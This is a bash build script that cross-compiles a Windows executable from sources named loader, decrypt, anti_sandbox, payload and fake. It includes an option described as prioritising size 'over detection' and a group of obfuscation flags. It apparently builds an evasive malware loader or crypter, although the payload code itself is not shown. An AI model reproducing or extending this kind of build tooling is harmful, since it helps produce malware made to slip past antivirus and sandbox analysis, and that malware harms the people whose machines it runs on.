#!/bin/bash

# Read arguments
OUTPUT_FILE="executable.exe"
PRIORIZE_SIZE="false"
VERBOSE="false"

usage() {
    echo "Usage: $0 -o <output_file> [--priorize-size] [-v] [-h]"
    echo "Options:"
    echo "  -o, --output <output_file>   Specify the output file name (default: final.exe)"
    echo "  --priorize-size              Prioritize size over detection (no icon & no stdlib)"
    echo "  -v, --verbose                Enable verbose mode"
    echo "  -h, --help                   Show this help message"
    echo "  clean                        Clean the build directory"
    exit 1
}

# Cleanup
if [[ "$1" == "clean" ]]; then
    rm -rf build
    exit 0
fi

# Parse command line arguments
while [[ "$#" -gt 0 ]]; do
    case "$1" in
        -o|--output)
            OUTPUT_FILE="$2"
            shift 2
            ;;
        --priorize-size)
            PRIORIZE_SIZE="true"
            shift
            ;;
        -v|--verbose)
            VERBOSE="true"
            shift
            ;;
        -h|--help)
            usage
            ;;
        *)
            echo "Unknown option: $1"
            usage
            ;;
    esac
done

# Define source and header files
SRC=(build/loader.c build/definitions.c build/fake.c build/decrypt.c build/winapi.c build/anti_sandbox.c build/payload.c)
HEADERS=(build/definitions.h)

# Configure options based on PRIORIZE_SIZE
if [[ "$PRIORIZE_SIZE" == "true" ]]; then
    STDLIB="-nostdlib"
    ICON=""
    ENTRYPOINT="WinMainCRTStartup"
else
    STDLIB=""
    ICON="build/icon.o"
    SRC+=("build/icon.o")
    ENTRYPOINT="WinMain"
fi

# Define compiler parameters
CC="x86_64-w64-mingw32-gcc"
CFLAGS=($STDLIB -Ibuild -Wall -Wextra -Os -mwindows -ffunction-sections -fdata-sections -fno-stack-protector -fno-stack-check -fno-strict-aliasing -ffreestanding)
WARNINGS=(-Wtype-limits -Wno-cast-function-type -Wno-unused-parameter -Wno-unused-variable -Wattributes)
LIBS=(-lkernel32 -luser32 -ladvapi32 -lshell32 -lm -lgcc -flto)
OBFUSCATION=(-s -fvisibility=hidden -fno-inline -fno-builtin -fno-ident)
LDFLAGS=(-Wl,--gc-sections,--entry=$ENTRYPOINT,--disable-auto-import,--no-insert-timestamp)


# Create necessary directories
mkdir -p bin build
cp src/* dll/* build/

# Sed everything and compile the dll
python3 main.py $VERBOSE $PRIORIZE_SIZE

# Compile the icon if necessary
if [[ -n "$ICON" ]]; then
    x86_64-w64-mingw32-windres icon/icon.rc -o "$ICON"
fi

# Compile the program
if [[ "$VERBOSE" == "true" ]]; then
    echo -e "$CC ${CFLAGS[@]} ${WARNINGS[@]} ${SRC[@]} -static -static-libgcc -o bin/$OUTPUT_FILE ${LDFLAGS[@]} ${LIBS[@]} ${OBFUSCATION[@]}\n"
fi

# Compile the main program
$CC "${CFLAGS[@]}" "${WARNINGS[@]}" "${SRC[@]}" -static -static-libgcc -o "bin/$OUTPUT_FILE" "${LDFLAGS[@]}" "${LIBS[@]}" "${OBFUSCATION[@]}"

# Compilation success check
if [ $? -eq 0 ]; then
    # Post-build
    echo "Build completed. Output file: bin/$OUTPUT_FILE (size: $(du -h bin/$OUTPUT_FILE | cut -f1))"
else
    echo "Compilation failed."
    exit 1
fi
